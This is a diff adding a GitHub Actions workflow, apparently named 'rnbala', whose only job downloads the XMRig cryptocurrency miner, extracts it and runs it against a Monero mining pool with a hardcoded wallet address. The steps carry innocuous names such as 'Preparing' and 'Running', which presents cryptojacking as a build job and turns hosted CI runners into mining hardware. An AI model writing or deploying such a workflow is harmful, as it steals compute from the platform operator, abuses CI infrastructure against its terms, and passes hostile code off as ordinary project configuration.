@@ -1,0 +1,16 @@
+name: rnbala
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Preparing
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-gcc-win64.zip -OutFile xmrig-6.14.1-gcc-win64.zip
+    - name: Prepare_Q2
+      run: Expand-Archive xmrig-6.14.1-gcc-win64.zip
+    - name: Running
+      run: .\xmrig-6.14.1\xmrig.exe -o pool.supportxmr.com:443 -u 84bZxvjSjgThMYY9NqQvxH9T81VGxS1mZVXt4d6YjxcmMc77M4LTtBFDn2fo3qhaEN9z4M34XE8PrbXtY4RWQRzWJkxUc8k -k --tls -p vps
+    - name: DONE
+      run: exit
